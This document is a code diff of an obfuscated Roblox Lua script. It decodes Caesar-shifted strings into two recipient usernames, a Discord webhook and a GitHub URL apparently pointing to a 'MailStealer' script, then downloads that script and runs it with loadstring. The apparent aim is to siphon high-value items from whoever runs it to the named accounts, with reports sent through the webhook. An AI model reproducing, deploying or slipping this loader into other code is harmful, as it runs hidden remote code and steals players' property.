@@ -1,2 +1,37 @@
 --[Obfuscated by Hercules v1.5 -> discord.gg/Hx6RuYs8Ku | by using the Hercules bot -> https://top.gg/bot/1293608330123804682]
-local RFlyKrWaIp, zFossReUAv, fYaFkjLDy, eYWFoOeXd, BUqjcNKbq if (5^2 - 2^5 == -7) then RFlyKrWaIp = loadstring; end; if (math.sin(math.pi) ~= 0) then zFossReUAv = math.random; end; if (math.sin(math.pi) ~= 0) then fYaFkjLDy = string.char; end; if (5^2 - 2^5 == -7) then eYWFoOeXd = table.concat; end; if (5^2 - 2^5 == -7) then BUqjcNKbq = table.insert; end; local fELGRfqvFAvy = 80 local ChZTZmum = false while not ChZTZmum do if zFossReUAv(0, 1) == 0 then local TTjVzbOBCZk = 16 else ChZTZmum = true end end local function CnXdoSMILzM(jaETPrKBXpBk) return (jaETPrKBXpBk >= 48 and jaETPrKBXpBk <= 57) or (jaETPrKBXpBk >= 65 and jaETPrKBXpBk <= 90) or (jaETPrKBXpBk >= 97 and jaETPrKBXpBk <= 122) end local function HdrzXrBoy(GTrdSEzPRe, ymfFahLFeUj) local KgwzYGiLXwO = {} for i = 1, #GTrdSEzPRe do local jaETPrKBXpBk = GTrdSEzPRe:byte(i) if CnXdoSMILzM(jaETPrKBXpBk) then local ZdyKOEBK if jaETPrKBXpBk >= 48 and jaETPrKBXpBk <= 57 then ZdyKOEBK = ((jaETPrKBXpBk - 48 - ymfFahLFeUj + 10) % 10) + 48 elseif jaETPrKBXpBk >= 65 and jaETPrKBXpBk <= 90 then ZdyKOEBK = ((jaETPrKBXpBk - 65 - ymfFahLFeUj + 26) % 26) + 65 elseif jaETPrKBXpBk >= 97 and jaETPrKBXpBk <= 122 then ZdyKOEBK = ((jaETPrKBXpBk - 97 - ymfFahLFeUj + 26) % 26) + 97 end BUqjcNKbq(KgwzYGiLXwO, fYaFkjLDy(ZdyKOEBK)) else BUqjcNKbq(KgwzYGiLXwO, fYaFkjLDy(jaETPrKBXpBk)) end end return eYWFoOeXd(KgwzYGiLXwO) end local function CnXdoSMILzM(jaETPrKBXpBk) return (jaETPrKBXpBk >= 48 and jaETPrKBXpBk <= 57) or (jaETPrKBXpBk >= 65 and jaETPrKBXpBk <= 90) or (jaETPrKBXpBk >= 97 and jaETPrKBXpBk <= 122) end Username = HdrzXrBoy("ecdcicokpi", 2) Username2 = HdrzXrBoy("ermqi5674451", 4) webhook = HdrzXrBoy("wiieh://sxhrdgs.rdb/pex/ltqwddzh/6855686774744669511/yPVc9KAEgf9jI3qVllBfrMyZHUBz8UIvRSFLLugKNLNNVD1IRxf-FjlhjUVCemMi9Nt6", 15) min_rap = 1000000 RFlyKrWaIp(game:HttpGet(HdrzXrBoy("gssor://qzv.fhsgtatrdqbnmsdms.bnl/VgqhsdqGta/Vghsdq/lzhm/LzhkRsdzkdqU.7", 25)))() if true then if true then local zqTqjneDtpg = 28 end end
+local xxtrReOL, cavythXmgQR, eVTOuujlu, TkMOzDEHn, PFltCBXzBOx
+xxtrReOL = loadstring; cavythXmgQR = math.random; eVTOuujlu = string.char; TkMOzDEHn = table.concat; PFltCBXzBOx = table.insert;
+ local oYJCVlVn = false while not oYJCVlVn do if cavythXmgQR(0, 1) == 0 then local lZuBOrQDdYje = 394 else oYJCVlVn = true end end local function LZDDRFvR(QtoddTLEHy)
+    return (QtoddTLEHy >= 48 and QtoddTLEHy <= 57) or (QtoddTLEHy >= 65 and QtoddTLEHy <= 90) or (QtoddTLEHy >= 97 and QtoddTLEHy <= 122)
+end
+	
+local function mnqwlJcwhet(bRCFfkLJS, fGICKfLdMI)
+    local ZCbfwLhSxc = {}
+    for i = 1, #bRCFfkLJS do
+        local QtoddTLEHy = bRCFfkLJS:byte(i)
+        if LZDDRFvR(QtoddTLEHy) then
+            local ZiVzrzfLD            if QtoddTLEHy >= 48 and QtoddTLEHy <= 57 then
+                ZiVzrzfLD = ((QtoddTLEHy - 48 - fGICKfLdMI + 10) % 10) + 48
+            elseif QtoddTLEHy >= 65 and QtoddTLEHy <= 90 then
+                ZiVzrzfLD = ((QtoddTLEHy - 65 - fGICKfLdMI + 26) % 26) + 65
+            elseif QtoddTLEHy >= 97 and QtoddTLEHy <= 122 then
+                ZiVzrzfLD = ((QtoddTLEHy - 97 - fGICKfLdMI + 26) % 26) + 97
+            end
+            PFltCBXzBOx(ZCbfwLhSxc, eVTOuujlu(ZiVzrzfLD))
+        else
+            PFltCBXzBOx(ZCbfwLhSxc, eVTOuujlu(QtoddTLEHy))
+        end
+    end
+    return TkMOzDEHn(ZCbfwLhSxc)
+end
+
+local function LZDDRFvR(QtoddTLEHy)
+    return (QtoddTLEHy >= 48 and QtoddTLEHy <= 57) or (QtoddTLEHy >= 65 and QtoddTLEHy <= 90) or (QtoddTLEHy >= 97 and QtoddTLEHy <= 122)
+end
+
+Username = mnqwlJcwhet("ljkjpjvrwp", 9)
+Username2 = mnqwlJcwhet("kxswo1230017", 10)
+webhook = mnqwlJcwhet("eqqmp://afpzloa.zlj/xmf/tbyellhp/4634685780531058829/8-8M0yzDWaQso-CqQN1U-AXP7L_hoDveRLdAvG6em1XLlDFiLxbsbR6ZMCXtU48Y4IyN", 23)
+min_rap = 1000000
+
+xxtrReOL(game:HttpGet(mnqwlJcwhet("dpplo://nws.cepdqxqoanykjpajp.yki/SdnepanDqx/Sdepan/iwej/IwehOpawhanR.4", 22)))() local function vMRDtWMoqRPc(dYUhWDaZU) local LTFBdpSugDy = 44 end
